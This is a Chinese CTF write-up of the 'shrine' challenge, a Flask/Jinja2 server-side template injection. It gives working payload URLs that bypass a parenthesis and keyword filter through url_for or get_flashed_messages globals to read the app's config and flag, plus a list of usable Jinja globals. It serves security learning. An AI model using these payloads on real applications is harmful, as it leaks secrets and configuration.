# shrine

整理题目给的代码得到:

```py
import flask 
import os 
app = flask.Flask(__name__) 
app.config['FLAG'] = os.environ.pop('FLAG') 

@app.route('/') 
def index(): 
    return open(__file__).read() 
    
@app.route('/shrine/') 
def shrine(shrine): 
    def safe_jinja(s): 
        s = s.replace('(', '').replace(')', '') 
        blacklist = ['config', 'self'] 
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s 
    return flask.render_template_string(safe_jinja(shrine)) 
    
if __name__ == '__main__': 
    app.run(debug=True)
```

在地址 `/shrine/` 后面存在 `SSTI` 注入. 尝试发现是 `Jinja2`:

```
http://111.200.241.244:50157/shrine/%7B%7B7*7%7D%7D 返回 49
http://111.200.241.244:50157/shrine/%7B%7B7*'7'%7D%7D 返回 7777777
```

根据 `source code` 我们知道 包括号 `(`, `)` 被过滤, `config` 和 `self` 把对应变量设为了 `None`.

找些资料没找到绕过 `filter ( 和 )` 的办法. 查看了 `write up`. [link](https://ctftime.org/writeup/10895). 原来可以用 `url_for` 或 `get_flashed_messages` 取到 `curent_app` 函数.

```
http://111.200.241.244:50157/shrine/%7B%7Burl_for%7D%7D 返回 <function url_for at 0x7fc2298b4c08>
http://111.200.241.244:50157/shrine/%7B%7Bget_flashed_messages%7D%7D 返回 <function get_flashed_messages at 0x7fc2298b4d70>
```

取到 `curent_app` 函数:

```
http://111.200.241.244:50157/shrine/%7B%7Burl_for.__globals__%7D%7D
http://111.200.241.244:50157/shrine/%7B%7Bget_flashed_messages.__globals__%7D%7D
```

`payload` 取得 `FLAG`:

```
http://111.200.241.244:50157/shrine/%7B%7Burl_for.__globals__['current_app'].config['FLAG']%7D%7D
http://111.200.241.244:50157/shrine/%7B%7Bget_flashed_messages.__globals__['current_app'].config['FLAG']%7D%7D
```

本题通过取得 `current_app` 函数获取 `FLAG`! `current_app` 拥有当前应用的所有环境.

一些可以使用的关键词:

```
url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config, self
```
